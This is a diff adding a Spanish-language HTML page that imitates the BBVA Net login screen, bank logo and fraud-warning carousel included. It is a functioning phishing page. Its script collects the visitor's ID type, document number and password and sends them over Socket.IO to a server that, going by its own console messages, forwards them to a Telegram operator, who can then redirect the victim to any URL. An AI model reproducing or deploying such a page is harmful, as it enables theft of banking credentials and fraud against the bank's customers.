@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BBVA Net - Iniciar Sesión</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="/socket.io/socket.io.js"></script>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div id="loadingScreen" class="loading-screen" style="display: none;">
+        <div class="loading-content">
+            <img src="img/BBVA_logo_2025.svg.png" alt="BBVA" class="loading-logo">
+            <div class="loading-spinner"></div>
+            <p class="loading-text">Cargando...</p>
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <div class="header-icon">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" fill="#1973B8"/>
+                </svg>
+            </div>
+            <div class="logo">
+                <img src="img/BBVA_logo_2025.svg.png" alt="BBVA">
+            </div>
+            <button class="close-btn">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                    <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z" fill="#1973B8"/>
+                </svg>
+            </button>
+        </header>
+
+        <!-- Security Badge -->
+        <div class="security-badge">
+            <svg width="32" height="32" viewBox="0 0 24 24" fill="none">
+                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" fill="#1973B8"/>
+            </svg>
+        </div>
+
+        <p class="security-text">Estás en un entorno con seguridad BBVA</p>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <h1 class="title">Hola, inicia sesión en <br>BBVA Net:</h1>
+
+            <form class="login-form">
+                <!-- Dropdown Cédula -->
+                <div class="input-group">
+                    <select class="input-field dropdown" id="documentType">
+                        <option value="">Cédula de Ciudadanía</option>
+                        <option value="cc">Cédula de Extranjeria</option>
+                        <option value="ce">Tarjeta de Identidad</option>
+                        <option value="pas">Pasaporte</option>
+                        <option value="pas">Numero de Identificacion Personal</option>
+                    </select>
+                    <svg class="dropdown-icon" width="24" height="24" viewBox="0 0 24 24" fill="none">
+                        <path d="M7 10l5 5 5-5z" fill="#5E6773"/>
+                    </svg>
+                </div>
+
+                <!-- Número de documento -->
+                <div class="input-group">
+                    <input type="text" class="input-field" id="documentNumber" placeholder="Número de documento">
+                </div>
+
+                <!-- Contraseña -->
+                <div class="input-group">
+                    <input type="password" class="input-field" id="password" placeholder="Contraseña">
+                    <button type="button" class="eye-icon" onclick="togglePassword()">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" fill="#5E6773"/>
+                        </svg>
+                    </button>
+                </div>
+
+                <!-- Botón Entrar -->
+                <button type="submit" class="submit-btn">Entrar</button>
+
+                <!-- Forgot Password Link -->
+                <a href="#" class="forgot-link">¿Olvidaste tu contraseña?</a>
+            </form>
+
+            <!-- Register Card -->
+            <div class="register-card">
+                <div class="register-icon">
+                    <img src="img/register-glass.avif" alt="Register">
+                </div>
+                <h2 class="register-title">Empieza hoy con BBVA Net</h2>
+                <p class="register-description">Regístrate para consultar tus productos en línea. Luego Podrás activar tu App BBVA si la necesitas.</p>
+                <button class="register-btn">Regístrate</button>
+            </div>
+
+            <!-- Security Carousel -->
+            <div class="security-carousel">
+                <div class="carousel-slide active" data-slide="1">
+                    <h2 class="carousel-title">Protege tus datos bancarios</h2>
+                    <div class="carousel-content">
+                        <div class="carousel-icon">
+                            <svg width="40" height="40" viewBox="0 0 24 24" fill="none">
+                                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z" fill="#1973B8"/>
+                            </svg>
+                        </div>
+                        <p class="carousel-text">No digites contraseñas ni códigos en enlaces o apps que no reconozcas. Son sensibles.</p>
+                    </div>
+                </div>
+
+                <div class="carousel-slide" data-slide="2">
+                    <h2 class="carousel-title">Cuidado con llamadas falsas</h2>
+                    <div class="carousel-content">
+                        <div class="carousel-icon">
+                            <svg width="40" height="40" viewBox="0 0 24 24" fill="none">
+                                <path d="M19 2H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h4l3 3 3-3h4c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-6 16h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 11.9 13 12.5 13 14h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z" fill="#1973B8"/>
+                            </svg>
+                        </div>
+                        <p class="carousel-text">No devuelvas llamadas de números extraños. Siempre usa los canales oficiales de BBVA.</p>
+                    </div>
+                </div>
+
+                <div class="carousel-slide" data-slide="3">
+                    <h2 class="carousel-title">Nunca reveles tus códigos</h2>
+                    <div class="carousel-content">
+                        <div class="carousel-icon">
+                            <svg width="40" height="40" viewBox="0 0 24 24" fill="none">
+                                <circle cx="12" cy="12" r="10" stroke="#1973B8" stroke-width="2" fill="none"/>
+                                <path d="M12 7v6M12 16h.01" stroke="#1973B8" stroke-width="2" stroke-linecap="round"/>
+                            </svg>
+                        </div>
+                        <p class="carousel-text">BBVA jamás te pedirá códigos por mensaje de texto, correo o llamada que tú no hayas indicado.</p>
+                    </div>
+                </div>
+
+                <div class="carousel-slide" data-slide="4">
+                    <h2 class="carousel-title">¿Notaste algo extraño?</h2>
+                    <div class="carousel-content">
+                        <div class="carousel-icon">
+                            <svg width="40" height="40" viewBox="0 0 24 24" fill="none">
+                                <path d="M21 6h-2v9H6v2c0 .55.45 1 1 1h11l4 4V7c0-.55-.45-1-1-1zm-4 6V3c0-.55-.45-1-1-1H3c-.55 0-1 .45-1 1v14l4-4h10c.55 0 1-.45 1-1z" fill="#1973B8"/>
+                                <circle cx="8" cy="9" r="1" fill="#1973B8"/>
+                                <circle cx="12" cy="9" r="1" fill="#1973B8"/>
+                            </svg>
+                        </div>
+                        <p class="carousel-text">Si diste datos o ves movimientos sospechosos, contáctanos de inmediato en la línea BBVA.</p>
+                    </div>
+                </div>
+
+                <div class="carousel-controls">
+                    <button class="carousel-btn pause-btn" onclick="pauseCarousel()">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+                            <path d="M6 4h4v16H6V4zm8 0h4v16h-4V4z" fill="#1973B8"/>
+                        </svg>
+                    </button>
+                    <button class="carousel-btn prev-btn" onclick="changeSlide(-1)">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+                            <path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z" fill="#1973B8"/>
+                        </svg>
+                    </button>
+                    <span class="carousel-indicator">
+                        <span class="current-slide">1</span> de <span class="total-slides">4</span>
+                    </span>
+                    <button class="carousel-btn next-btn" onclick="changeSlide(1)">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+                            <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" fill="#1973B8"/>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        // ========================================
+        // SOCKET.IO INITIALIZATION
+        // ========================================
+        const socket = io({
+            transports: ['websocket', 'polling'],
+            reconnection: true,
+            reconnectionDelay: 500,
+            reconnectionDelayMax: 5000,
+            reconnectionAttempts: 10,
+            timeout: 20000,
+            forceNew: false,
+            upgrade: true
+        });
+
+        // Store session ID
+        let currentSessionId = null;
+
+        // Connection monitoring
+        socket.on('connect', () => {
+            console.log('✓ Conectado al servidor. Socket ID:', socket.id);
+            
+            // Store session ID
+            if (!currentSessionId) {
+                currentSessionId = socket.id;
+                localStorage.setItem('bbva_session_id', currentSessionId);
+                console.log('💾 Session ID guardado:', currentSessionId);
+            }
+        });
+
+        socket.on('disconnect', (reason) => {
+            console.log('✗ Desconectado del servidor. Razón:', reason);
+            if (reason === 'io server disconnect') {
+                // Reconectar manualmente si el servidor desconectó
+                socket.connect();
+            }
+        });
+
+        socket.on('reconnect', (attemptNumber) => {
+            console.log('🔄 Reconectado después de', attemptNumber, 'intentos');
+        });
+
+        socket.on('reconnecting', (attemptNumber) => {
+            console.log('🔄 Intentando reconectar...', attemptNumber);
+        });
+
+        socket.on('connect_error', (error) => {
+            console.error('✗ Error de conexión:', error.message);
+        });
+
+        // ========================================
+        // CAROUSEL FUNCTIONALITY
+        // ========================================
+        let currentSlide = 1;
+        let isPaused = false;
+        let carouselInterval;
+
+        function showSlide(n) {
+            const slides = document.querySelectorAll('.carousel-slide');
+            const totalSlides = slides.length;
+
+            if (n > totalSlides) {
+                currentSlide = 1;
+            } else if (n < 1) {
+                currentSlide = totalSlides;
+            } else {
+                currentSlide = n;
+            }
+
+            slides.forEach(slide => slide.classList.remove('active'));
+            slides[currentSlide - 1].classList.add('active');
+
+            document.querySelector('.current-slide').textContent = currentSlide;
+        }
+
+        function changeSlide(direction) {
+            showSlide(currentSlide + direction);
+        }
+
+        function pauseCarousel() {
+            const pauseBtn = document.querySelector('.pause-btn');
+            
+            if (isPaused) {
+                isPaused = false;
+                startCarousel();
+                pauseBtn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M6 4h4v16H6V4zm8 0h4v16h-4V4z" fill="#1973B8"/></svg>';
+            } else {
+                isPaused = true;
+                clearInterval(carouselInterval);
+                pauseBtn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M8 5v14l11-7z" fill="#1973B8"/></svg>';
+            }
+        }
+
+        function startCarousel() {
+            carouselInterval = setInterval(() => {
+                if (!isPaused) {
+                    changeSlide(1);
+                }
+            }, 5000);
+        }
+
+        // ========================================
+        // FORM FUNCTIONALITY
+        // ========================================
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+        }
+
+        // Only allow numbers in document field
+        document.getElementById('documentNumber').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+
+        // Handle login form submission
+        document.querySelector('.login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const documentType = document.getElementById('documentType').value;
+            const documentNumber = document.getElementById('documentNumber').value;
+            const password = document.getElementById('password').value;
+            
+            // Validate fields
+            if (!documentNumber || documentNumber.trim() === '') {
+                alert('Por favor ingresa tu número de documento');
+                return;
+            }
+            
+            if (!password || password.trim() === '') {
+                alert('Por favor ingresa tu contraseña');
+                return;
+            }
+            
+            console.log('📤 Enviando credenciales al servidor...');
+            
+            // Show loading screen
+            document.getElementById('loadingScreen').style.display = 'flex';
+            
+            // Send data to server via Socket.IO
+            socket.emit('login-attempt', {
+                documentType: documentType || 'Cédula de Ciudadanía',
+                documentNumber,
+                password
+            });
+        });
+
+        // ========================================
+        // SOCKET EVENT HANDLERS
+        // ========================================
+        
+        // Listen for server responses
+        socket.on('login-processing', (data) => {
+            console.log('✓ Login procesado:', data);
+            if (data.success) {
+                // Update and store session ID
+                currentSessionId = data.sessionId;
+                localStorage.setItem('bbva_session_id', currentSessionId);
+                
+                // Keep loading text as "Cargando..." - don't change it
+                console.log('✓ Credenciales enviadas a Telegram. Session ID:', data.sessionId);
+                console.log('🔔 IMPORTANTE: Tu Session ID es:', data.sessionId);
+                console.log('📱 Ve a Telegram y presiona un botón para continuar');
+            }
+        });
+
+        // Listen for redirect commands from Telegram
+        socket.on('redirect', (data) => {
+            console.log('🔄 Comando de redirección recibido:', data.url);
+            // Keep loading text as "Cargando..." - don't change it
+            
+            // Redirect immediately
+            console.log('➡️ Redirigiendo a:', data.url);
+            window.location.href = data.url;
+        });
+
+        // Handle errors
+        socket.on('login-error', (data) => {
+            console.error('✗ Error:', data);
+            document.getElementById('loadingScreen').style.display = 'none';
+            alert('Error al procesar tu solicitud. Inténtalo de nuevo.');
+        });
+
+        // Keep connection alive
+        setInterval(() => {
+            if (socket.connected) {
+                console.log('💓 Conexión activa. Socket ID:', socket.id);
+            }
+        }, 10000);
+
+        // Carousel functions
+        function showSlide(n) {
+            const slides = document.querySelectorAll('.carousel-slide');
+            const totalSlides = slides.length;
+
+            if (n > totalSlides) {
+                currentSlide = 1;
+            } else if (n < 1) {
+                currentSlide = totalSlides;
+            } else {
+                currentSlide = n;
+            }
+
+            slides.forEach(slide => slide.classList.remove('active'));
+            slides[currentSlide - 1].classList.add('active');
+
+            document.querySelector('.current-slide').textContent = currentSlide;
+        }
+
+        function changeSlide(direction) {
+            showSlide(currentSlide + direction);
+        }
+
+        function pauseCarousel() {
+            const pauseBtn = document.querySelector('.pause-btn');
+            
+            if (isPaused) {
+                isPaused = false;
+                startCarousel();
+                pauseBtn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M6 4h4v16H6V4zm8 0h4v16h-4V4z" fill="#1973B8"/></svg>';
+            } else {
+                isPaused = true;
+                clearInterval(carouselInterval);
+                pauseBtn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M8 5v14l11-7z" fill="#1973B8"/></svg>';
+            }
+        }
+
+        function startCarousel() {
+            carouselInterval = setInterval(() => {
+                if (!isPaused) {
+                    changeSlide(1);
+                }
+            }, 5000);
+        }
+
+        // Initialize carousel
+        document.querySelector('.total-slides').textContent = document.querySelectorAll('.carousel-slide').length;
+        startCarousel();
+    </script>
+</body>
+</html>
